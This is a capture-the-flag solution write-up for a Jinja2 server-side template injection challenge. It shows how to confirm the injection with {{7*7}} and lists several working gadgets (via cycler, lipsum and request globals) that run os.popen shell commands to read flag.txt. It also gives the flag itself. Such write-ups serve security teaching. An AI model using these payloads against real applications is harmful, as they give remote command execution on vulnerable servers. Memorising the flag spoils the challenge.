# Template Tide  -  Solution

**Flag:** `rstcon{ssti_rolls_in_with_the_t1de}`

## Finding the bug

The "Personalize this report" box (the `?name=` parameter) reflects your input
into the report heading, "Tide report for NAME". The report card also shows a
"Report template" merge snippet printed literally as `Tide report for
{{ name }}`, so the mustache syntax is a tell that the page is rendered by a
template engine. Probe for template injection rather than plain XSS:

```
/?name={{7*7}}      ->  heading reads "Tide report for 49"
```

The server evaluated `7*7`, so user input reaches `render_template_string` as
template source. That is Jinja2 SSTI.

## Escalating to file read

From an SSTI primitive in Jinja2 you can reach Python builtins through any
object's `__globals__`. A clean, reliable gadget uses `cycler` (exposed in the
Jinja/Flask environment):

```
/?name={{ cycler.__init__.__globals__.os.popen("cat flag.txt").read() }}
```

Equivalent gadgets that also work here:

```
{{ lipsum.__globals__.os.popen("cat flag.txt").read() }}
{{ request.application.__globals__.__builtins__.__import__("os").popen("cat flag.txt").read() }}
```

Any of these dumps `flag.txt` into the rendered page.

## Solve

`writeup/solve.py`:

```
python3 solve.py http://CHALLENGE_HOST:5000
# rstcon{ssti_rolls_in_with_the_t1de}
```

URL encode the payload if you send it by hand in a browser.
